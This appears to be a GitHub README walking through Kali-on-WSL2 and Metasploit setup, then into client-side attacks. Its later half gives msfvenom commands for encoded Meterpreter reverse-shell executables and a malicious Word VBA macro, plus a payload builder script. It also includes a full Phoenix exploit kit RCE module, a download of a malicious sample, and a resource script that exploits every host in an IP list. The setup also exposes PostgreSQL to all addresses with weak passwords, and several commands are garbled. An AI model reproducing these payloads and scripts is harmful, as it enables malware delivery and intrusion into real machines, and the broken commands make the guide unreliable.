# Open Powershell as Administrator
```
Enable-WindowsOptionalFeature -Online -FeatureName Microsoft-Windows-Subsystem-Linux
```
# Restart
# Open PowerShell as administrator and run:
```
dism.exe /online /enable-feature /featurename:VirtualMachinePlatform /all /norestart
dism.exe /online /enable-feature /featurename:Microsoft-Windows-Subsystem-Linux /all /norestart
```
# Download and install the WSL2 Linux Kernel from here: https://aka.ms/wsl2kernel
# Open PowerShell as administrator and run: 
```
wsl --set-default-version 2
```
# Install Kali Linux from the Microsoft Store
- Note: to upgrade an existing WSL1 kali-linux installation, type: wsl --set-version kali-linux 2

# Run Kali and finish the initial setup
- create user
- set password
```
sudo apt update
```
# if you want to use GUI graphical user interface:

![image](https://user-images.githubusercontent.com/65768277/230106104-2423a010-9e37-49b2-940b-e4f1062b9d1d.png)
```
sudo apt install -y kali-win-kex
```
# To start Win-KeX in Seamless mode with sound support, run

```
kex --sl -s
```
# To start Xtigervnc
![image](https://user-images.githubusercontent.com/65768277/230105294-4fbde379-ccab-4818-a4fc-50882bb638eb.png)
```
kex
```
- Full documentation on Win-KeX: https://www.kali.org/docs/wsl/win-kex/

# INSTALLING METASPLOIT-FRAMEWORK & DEPENDANCIES 
```
sudo apt install openssh-client
sudo apt install openssh-server
sudo launchctl stop com.openssh.sshd
sudo launchctl start com.openssh.sshd
```
# Install Java
```
sudo add-apt-repository -y ppa:webupd8team/java
sudo apt-get update
sudo apt-get -y install oracle-java8-installer
```
# Install Metasploit-Framework
```
sudo apt-get update
sudo apt-get upgrade 
cd /etc
sudo git clone https://github.com/rapid7/metasploit-framework.git
sudo chown -R `whoami` /etc/metasploit-framework
```
# Install rbenv & ruby
* if you do not care to change ruby versions, you do not need to install rvm or rbenv ( I sugguest you do ) 
* but if your not this will do:
```
sudo apt install ruby-dev
```
# Install ruby with rbenv
```
cd ~
git clone git://github.com/sstephenson/rbenv.git .rbenv
echo 'export PATH="$HOME/.rbenv/bin:$PATH"' >> ~/.bashrc
echo 'eval "$(rbenv init -)"' >> ~/.bashrc
exec $SHELL
```
```
git clone git://github.com/sstephenson/ruby-build.git ~/.rbenv/plugins/ruby-build
echo 'export PATH="$HOME/.rbenv/plugins/ruby-build/bin:$PATH"' >> ~/.bashrc
```
```
git clone git://github.com/dcarley/rbenv-sudo.git ~/.rbenv/plugins/rbenv-sudo
```
```
exec $SHELL
```
```
RUBYVERSION=$(wget https://raw.githubusercontent.com/rapid7/metasploit-framework/master/.ruby-version -q -O - )
rbenv install $RUBYVERSION
rbenv global $RUBYVERSION
ruby -v
```
```
gem install bundler
bundle install
```
```
cd metasploit-framework
sudo bash -c 'for MSF in $(ls msf*); do ln -s /etc/metasploit-framework/$MSF /usr/local/bin/$MSF;done'
```
# Install NMAP
```
mkdir ~/Development
cd ~/Development
git clone https://github.com/nmap/nmap.git
cd nmap 
./configure
make
sudo make install
make clean
```
# Set up Metasploit-dev envirorment
```
export GITHUB_USERNAME=h4xrOx
export GITHUB_EMAIL=h4xr0x@h4xr0x.cc
mkdir -p ~/git
cd ~/git
git clone git@github.com:h4xrOx/metasploit-framework
cd ~/git/metasploit-framework
```
# Make publilc & private keys for github
```
ssh-keygen -t rsa -b 4096 -C "h4xr0x@h4xr0x.cc"
ssh-keygen -t rsa -b 4096 -C "h4xr0x@h4xr0x.cc"
```
# ADD public key to your github account 
* Github Docs: https://docs.github.com/en/authentication/connecting-to-github-with-ssh/adding-a-new-ssh-key-to-your-github-account

* copy your public ssh key
 ```
 cd cat ~/.ssh/id_ed25519.pub
 ```
* In the upper-right corner of any page, click your profile photo, then click Settings.

https://docs.github.com/assets/cb-34573/images/help/settings/userbar-account-settings.png

* In the "Access" section of the sidebar, click  SSH and GPG keys.
* Click New SSH key or Add SSH key.

https://docs.github.com/assets/cb-28257/images/help/settings/ssh-add-ssh-key-with-auth.png

*  Name your key whatever you want & Paste copied contents of ~/.ssh/id_ed25519.pub into the "Key" field.

https://docs.github.com/assets/cb-47495/images/help/settings/ssh-key-paste-with-type.png

# Keep metasploit up to date
```
git remote add upstream git@github.com:rapid7/metasploit-framework.git
git fetch upstream
git checkout -b upstream-master --track upstream
```
```
git config --global user.name h4xrOx
git config --global user.email h4xr0x@h4xr0x.cc
git config --global github.user "h4xrOx"m/master
```
# Setting up POSTGRESQL for Database support
- Starting postgres

```
sudo apt-get update
sudo apt-get -y install postgresql postgresql-contrib
systemctl start postgresql.service
sudo service postgresql start
```
# Find where postgresql.conf is located

```
sudo -u postgres psql -c 'SHOW config_file'
```
# edit postgresql.conf 
* sudo nano directory shown from "sudo -u postgres psql -c 'SHOW config_file'"

```
sudo nano /etc/postgresql/15/main/postgresql.conf
```
# Edit postgresql.con ctrl + x & Y to save
* uncomment (sic!) listen_address line;
* change it to listen_address = '*' for every available IP address or comma-separated list of addresses;

# Restart postgresql
```
sudo service postgresql restart
```

# createuser msf_dev 

```
sudo -u postgres psql 
$postgres=# CREATE USER dev PASSWORD 'strongone' CREATEDB;
$CREATE ROLE
\q
```
```
psql -U dev -h 127.0.0.1 -d postgres
```
* Password for user dev: strongone
```
\q
```
# allow remote hosts
* find pg_hba.conf
```
sudo -u postgres psql -c 'SHOW hba_file'
```
* edit pg_hba.conf
```
sudo nano /etc/postgresql/15/main/pg_hba.conf
```
* ADD THE FOLLOWING TO THE pg_hba.conf file
```
host    all             all              0.0.0.0/0                       scram-sha-256
host    all             all              ::/0                            scram-sha-256
```
```
sudo service postgresql restart
```
# find your IP address 
```
bash -c "hostname -I"
hostname -I
wsl -- hostname -I
```
# Now that we know the IP address, we can connect to PostgreSQL on WSL2 with psql:
```
psql -U dev -d postgres -h "yourip"
```
# start metasploit console
```
sudo ./msfconsole -qx
```

# Enable the database on startup
* sudo nano /etc/metasploit4/config/database.yml
```
cat > /etc/metasploit4/config/database.yml << EOF
production:
    adapter: postgresql
    database: msf_database
    username: msf_dev
    password: password
    host: 127.0.0.1
    port: 5432
    pool: 75
    timeout: 5
EOF
```
* Use the database configuration file and connect to this database during each startup of msfconsole. Also change to the workspace of yur current pentesting project.
```
cat > ~/.msf4/msfconsole.rc << EOF
db_connect -y /etc/metasploit4/config/database.yml
workspace -a msf_dev
EOF
```
# init msfdb
```
cd /etc/metasploit-framework/
./msfdb init
```
- Check the database

```db_status```
[*] postgresql connected to msf_database

- Scan the local network network:

```db_nmap 192.168.1.0/24```

- List hosts which are in the database:

```hosts```
```
<table>
address        mac                name       os_name  os_flavor  os_sp  purpose  info  comments
-------        ---                ----       -------  ---------  -----  -------  ----  --------
192.168.1.1    11:22:33:44:55:66  router     Linux    2.6.X             device         
192.168.1.100  22:33:44:55:66:77  mixer      Linux    2.6.X             device 
<table>
```

* List all the db commands for the version of metasploit you have installed:

``` help database```

* if you are having troubles with POSTGRESQL heres a trouble shooting guide: https://fedoraproject.org/wiki/Metasploit_Postgres_Setup#Troubleshooting

# starting msfconsole:

```./msfconsole```

# Connect to database with msfconsole:

```db_connect msf_dev:password@127.0.0.1:5432/msf_database```

- Open a text editor, like vim, and enter the following:
```
vim /etc/framework/config/database.yml
```
```
nano /etc/framework/config/database.yml
```
# add this Note: The database, username, password, and port attributes need to be updated with the values you've chosen for your database.
```
development:
adapter: "postgresql"
database: "msf_database"
username: "msf_dev"
password: "password"
port: 5432
host: "localhost"
pool: 256
timeout: 5

production:
adapter: "postgresql"
database: "msf_database"
username: "msf_user"
password: "password"
port: 5432
host: "localhost"
pool: 256
timeout: 5
```
# Start the database
```
db_connect -y /etc/metasploit/config/database.yml
```

# To copy database.yml to the .msf4 folder, run the following command:
```
cp /etc/framework/config/database.yml /root/.msf4/
```

# Usage: msfdb [options] example: msfdb start

Options:
* Execute msfdb --help for the complete usage information
Commands:
* init - initialize the component
* reinit - delete and reinitialize the component
* delete - delete and stop the component
* status - check component status
* start - start the component
* stop - stop the component
* restart - restart the component

# Restart your terminal 
- Assuming you are using ubuntu or kali WSL2 terminal, set up metasploit-framework and have started `msfconsole` & `msfdb status` shows connection
- lets configure some options to add functionality to metasploits
* NOTE: LHOST=YOUR_LOCAL_IP, 
- open powershell type: ipconfing, your IP = IPv4 Address
- open kali / ubuntu type: ifconfig your IP = inet

# changing default options

``` 
set ConsoleLogging true
set LogLevel 5
set SessionLogging true
set TimestampOutput true
set PROMPT %T S:%S J:%J L:%L H:%H D:%D U:%U
```

# making sure you can get a session

```set ExitOnSession false``` 

# configure client side attacks
- This will create a single exe file which it will establish multiple connections:

```
msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/shikata_ga_nai
LHOST=192.168.1.103
LPORT=80
exitfunc=thread > /tmp/msf.raw msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/shikata_ga_nai
LHOST=192.168.1.103
LPORT=443
exitfunc=thread -c /tmp/msf.raw > /tmp/msf1.raw msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai
LHOST=192.168.1.103
LPORT=21
exitfunc=thread -c /tmp/msf1.raw > msf.exe
```

# Likewise you can use this feature for a VBScript attack in order to create a malicious Word document as well

```
msfvenom -p windows/meterpreter/reverse_tcp -f vba -e x86/shikata_ga_nai
LHOST=192.168.1.103
LPORT=21
exitfunc=thread -c /tmp/msf1.raw > msf.vba
```

# copy this script and run it to automatically use your configuration when doing client side attacks
```
#!/bin/bash 
# Simple builder
LHOST="192.168.1.103"
LPORTS="4444 5555 6666"
rm -fr /tmp/msf.raw rm -fr /tmp/msf1.raw
echo "Building…"
echo -n "Port: `echo $LPORTS | cut -d " " -f 1`" 
echo "" msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/shikata_ga_nai 
LHOST=$LHOST 
LPORT=`echo $LPORTS | cut -d " " -f 1` exitfunc=thread > /tmp/msf.raw 
for LPORT in `echo $LPORTS` do 
    echo -n "Port: $LPORT"
    echo "" msfvenom -p windows/meterpreter/reverse_tcp -f raw -e x86/shikata_ga_nai LHOST=$LHOST
    LPORT=$LPORT
    exitfunc=thread -c /tmp/msf.raw > /tmp/msf1.raw cp /tmp/msf1.raw /tmp/msf.raw 
done
```

# Change option –f exe to –f vba in order to create a vba file 

```
msfvenom -p windows/meterpreter/reverse_tcp -f exe -e x86/shikata_ga_nai
LHOST=$LHOST
LPORT=$LPORT
exitfunc=thread -c /tmp/msf1.raw > msf.exe rm -fr /tmp/msf.raw rm -fr /tmp/msf1.raw
echo -n "Done!"
```
# setup phoneix command
```
msf > search phoenix
msf > use auxiliary/admin/scada/phoenix_command
msf auxiliary(phoenix_command) > set RHOST [ip or hostname]
msf auxiliary(phoenix_command) > set ACTION REV
```
# Edit Phoenix_Exec.rb

```sudo cd nano /modules/multi/http/phoenix_exec.rb```

```
<ruby>
##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Exploit::Remote
  Rank = ExcellentRanking

  include Msf::Exploit::Remote::HttpClient

  def initialize(info={})
    super(update_info(info,
      'Name'           => 'Phoenix Exploit Kit Remote Code Execution',
      'Description'    => %q{
        This module exploits a Remote Code Execution in the web panel of Phoenix Exploit Kit via geoip.php. The
        Phoenix Exploit Kit is a popular commercial crimeware tool that probes the browser of the visitor for the
        presence of outdated and insecure versions of browser plugins like Java and Adobe Flash and Reader,
        silently installing malware if found.
      },
      'License'        => MSF_LICENSE,
      'Author'         =>
        [
          'CrashBandicot', #initial discovery by @DosPerl
          'Jay Turla' #msf module by @shipcod3
        ],
      'References'     =>
        [
          [ 'EDB', '40047' ],
          [ 'URL', 'http://krebsonsecurity.com/tag/phoenix-exploit-kit/' ], # description of Phoenix Exploit Kit
          [ 'URL', 'https://www.pwnmalw.re/Exploit%20Pack/phoenix' ]
        ],
      'Privileged'     => false,
      'Platform'       => 'php',
      'Arch'           => ARCH_PHP,
      'Targets'        =>
        [
          [ 'Automatic', {} ]
        ],
      'DisclosureDate' => '2016-07-01',
      'DefaultTarget'  => 0))

    register_options(
      [
        OptString.new('TARGETURI', [true, 'The path of geoip.php which is vulnerable to RCE', '/Phoenix/includes/geoip.php'])
      ])
  end

  def check
    test = Rex::Text.rand_text_alpha(8)
    res = http_send_command("echo \"#{test}\";")
    if res && res.body.include?(test)
      return Exploit::CheckCode::Vulnerable
    end
    Exploit::CheckCode::Safe
  end

  def exploit
    encoded = Rex::Text.encode_base64(payload.encoded)
    http_send_command("eval(base64_decode(\"#{encoded}\"));")
  end

  def http_send_command(cmd)
    send_request_cgi(
      'method'   => 'GET',
      'uri'      => normalize_uri(target_uri.path),
      'vars_get' => {
        'bdr' => cmd
      }
    )
  end
end
<ruby>
```

# navigato to DIR ~/git/metasploit-framework/modules/exploits/multi/http/Phoenix

```
cd ~/git/metasploit-framework/modules/exploits/multi/http/Phoenix
```

```
mkdir Phoenix

cd Phoenix
touch ip_lists.txt
sudo nano ip_lists.txt

mkdir includes
cd includes
```

# Download malicious copy of geoip.php into includes DIR

```
wget https://raw.githubusercontent.com/shipcod3/IRC-Bot-Hunters/master/malicious_samples/geoip.php
```

# create the following script. Notice you will probably need to modify the ip_list path, and payload options accordingly, 

```touch exploit_hosts.rc```
```sudo nano exploit_hosts.rc```

# copy and paste ctrl + x SAVE: Y

```
<resource script>
#
# Modify the path if necessary
#
ip_list = 'exploit/modules/multi/http/Phoenix/ip_list.txt'

File.open(ip_list, 'rb').each_line do |ip|
  print_status("Trying against #{ip}")
  run_single("use exploit/multi/http/phoenix_exec")
  run_single("set RHOST #{ip}")
  run_single("set DisablePayloadHandler true")

  #
  # Set a payload that's the same as the handler.
  # You might also need to add more run_single commands to configure other
  # payload options.
  #
  run_single("set PAYLOAD [payload name]")
 run_single("use auxiliary/admin/scada/phoenix_command")
run_single("set RHOSTS #{framework.db.hosts.map(&:address).join(' ')}")
run_single("set AutoRunScript post/multi/manage/multi_post MACRO=/root/autoexploit.rc")
  run_single("run")
end
<resource script>
```

``` save -g```

# payload generation, open a new terminal:


msfconsole -qx "use exploit/multi/handler; set payload                                                                                                  windows/x64/meterpreter/reverse_tcp;set lhost eth0; set lport 4445; set EXITFUNC thread; set AutoRunScript post/multi/manage/multi_post; MACRO=/root/autoexploit.rc; set ExitOnSession false; exploit -j"




